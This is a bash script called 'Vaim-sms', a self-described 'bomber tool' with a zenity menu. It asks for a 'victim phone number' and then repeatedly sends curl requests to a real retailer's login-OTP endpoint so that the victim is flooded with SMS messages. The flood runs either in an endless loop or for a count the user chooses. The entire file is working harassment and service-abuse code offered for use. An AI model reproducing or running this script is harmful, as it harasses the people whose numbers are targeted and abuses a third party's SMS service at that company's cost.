#!/bin/bash
#==========================================================================================================================
#========================================================================================================================== 
#Vaim-sms v1.0
#don't use my code with giving me credit 
#if you use without giving me credit then you won't became a programmer so please respect
#Youtube channel : https://www.youtube.com/channel/UCDWhaLh7OIKzH4Bk952l7Iw
#Github (coded by vaimpier ritik ) >>> : https://github.com/VaimpierOfficial
#For business : sonuv0085@gmail.com
#vaimpier_ritik
#==========================================================================================================================
#==========================================================================================================================







Att_ck(){

#ek function call karke yaha info dena ki abhi ye indian ke liye hai only :)
#num_info()
num=$(zenity --width=400 --height=250 --title Vaim-sms v2.1 --text "Enter your vicitm phone number" --entry)
#ek function for check verify number 
mssg=$(zenity --width=400 --height=250 --title Vaim-sms v2.1 --text "How many msg you want to send on +91${num}" --entry)

zenity --question --text="Do you want unlimitly?" --no-wrap --title Vaim-sms v2.1 --ellipsize

if [ "$?" -eq "0" ];then
	start

elif [ "$?" -eq "1" ];then
	start_w
else
	echo "Att_ck"
fi

}

scs(){


zenity --info --width=200 --title Vaim-sms v2.1 --text "Attack sucessfully done"
menu

}


start(){

opr | zenity --progress --auto-close --width=400 --height=250
scs



}

opr(){

echo 2
echo "#collectiong information successfully..."
sleep 1

echo 25
echo "#sending connection ok"
sleep 1

echo 40
echo "#attack in +91${num}"
while true
do
curl -i -s -k -X $'GET' \
    -H $'Host: express.shop.bigbazaar.com' -H $'Connection: close' -H $'sec-ch-ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Origin: https://shop.bigbazaar.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://shop.bigbazaar.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' \
    $'https://express.shop.bigbazaar.com/express/customer/'$num'/loginOtpInitiate' > namelog.txt
done



}

nonstart(){

echo 2
echo "#collectiong information successfully..."
sleep 1

echo 25
echo "#sending connection ok"
sleep 1

echo 40
echo "#attack in +91${num}"



for ((i=1; i<=$mssg; i++))
do
curl -i -s -k -X $'GET' \
    -H $'Host: express.shop.bigbazaar.com' -H $'Connection: close' -H $'sec-ch-ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Origin: https://shop.bigbazaar.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://shop.bigbazaar.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' \
    $'https://express.shop.bigbazaar.com/express/customer/'$num'/loginOtpInitiate' > namefor.txt

done


}


start_w(){

nonstart | zenity --progress --auto-close --width=400 --height=250
scs

}


Up_Date(){
zenity --info --width=200 --title Vaim-sms v2.1 --text "Already Latest version"
#code for update
menu
}

Equit(){

exit
exit

}

menu(){

mai=$(zenity --title "Vaim-sms v2.1" --width=400 --height=250 --list --column Select --column  Options 1 Attack 2 Update 3 Exit --height=250 --width=300 --text "This is a bomber tool" 2>&1)

case "${mai}" in 
	1) Ac=1;; 
	2) Ac=2;; 
	3) Ac=3;;
	*) echo "error";; 
esac


if [ "$Ac" -eq 1 ];then
	Att_ck
elif [ "$Ac" -eq 2 ];then
	Up_Date
elif [ "$Ac" -eq 3 ];then
	Equit
else
	menu
fi



}

#sudo apt install zenity curl
menu
